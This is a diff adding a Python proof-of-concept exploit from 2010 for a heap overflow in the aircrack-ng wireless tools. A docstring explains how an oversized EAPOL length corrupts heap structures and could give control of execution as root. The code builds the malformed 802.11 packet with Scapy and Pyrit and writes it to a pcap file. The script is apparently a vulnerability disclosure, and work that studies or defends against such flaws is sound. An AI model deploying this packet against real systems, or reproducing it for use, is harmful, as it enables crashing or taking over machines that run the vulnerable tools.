@@ -1,0 +1,74 @@
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+
+''' A remote-exploit against the aircrack-ng tools. Tested up to svn r1675.
+    
+    The tools' code responsible for parsing IEEE802.11-packets assumes the
+    self-proclaimed length of a EAPOL-packet to be correct and never to exceed
+    a (arbitrary) maximum size of 256 bytes for packets that are part of the
+    EAPOL-authentication. We can exploit this by letting the code parse packets
+    which:
+     a) proclaim to be larger than they really are, possibly causing the code
+        to read from invalid memory locations while copying the packet;
+     b) really do exceed the maximum size allowed and overflow data structures
+        allocated on the heap, overwriting libc's allocation-related
+        structures. This causes heap-corruption.
+    
+    Both problems lead either to a SIGSEGV or a SIGABRT, depending on the code-
+    path. Careful layout of the packet's content can even possibly alter the
+    instruction-flow through the already well known heap-corruption paths
+    in libc. Playing with the proclaimed length of the EAPOL-packet and the
+    size and content of the packet's padding immediately end up in various
+    assertion errors during calls to free(). This reveals the possibility to
+    gain control over $EIP.
+    
+    Given that we have plenty of room for payload and that the tools are
+    usually executed with root-privileges, we should be able to have a
+    single-packet-own-everything exploit at our hands. As the attacker can
+    cause the various tools to do memory-allocations at his will (through
+    faking the appearance of previously unknown clients), the resulting
+    exploit-code should have a high probability of success.
+
+    The demonstration-code below requires Scapy >= 2.x and Pyrit >= 0.3.1-dev
+    r238 to work. It generates pcap-file with single packet of the following
+    content:
+    
+    0801000000DEADC0DE0000DEADC0DE010000000000000000AAAA03000000888E0103FDE8FE0
+    108000000000000000000000000000000000000000000000000000000000000000000000000
+    000000000000000000000000000000000000000000000000000000000000000000000000000
+    000000000000000000000000000000000000043616E20492068617320736F6D65206D6F6172
+    3F
+
+    03/27/2010, Lukas Lueg, lukas.lueg@gmail.com
+'''
+
+import cpyrit.pckttools
+import scapy.layers
+
+# A IEEE802.11-packet with LLC- and SNAP-header, looking like the second
+# phase of a EAPOL-handshake (the confirmation). The size set in the EAPOL-
+# packet will cause an overflow of the "eapol"-field in struct WPA_ST_info and
+# struct WPA_hdsk.
+# We have plenty of room for exploit-payload as most of the fields in the
+# EAPOL_Key-packet are not interpreted. As far as I can see, the adjacent
+# heap structure will be overwritten by the value of EAPOL_WPAKey.Nonce in
+# case of airodump-ng...
+pckt = scapy.layers.dot11.Dot11(addr1='00:de:ad:c0:de:00',       \
+                                addr2='00:de:ad:c0:de:01',       \
+                                FCfield='to-DS')                 \
+       / scapy.layers.dot11.LLC()                                \
+       / scapy.layers.dot11.SNAP()                               \
+       / scapy.layers.l2.EAPOL(len=65000)                        \
+       / cpyrit.pckttools.EAPOL_Key()                            \
+       / cpyrit.pckttools.EAPOL_WPAKey(KeyInfo = 'pairwise+mic') \
+       / scapy.packet.Padding(load='Can I has some moar?')
+
+if __name__ == '__main__':
+    print "Packet's content:"
+    print ''.join("%02X" % ord(c) for c in str(pckt))
+    filename = 'aircrackng_exploit.cap'
+    print "Writing to '%s'" % filename
+    writer = cpyrit.pckttools.Dot11PacketWriter(filename)
+    writer.write(pckt)
+    writer.close()
+    print 'Done'
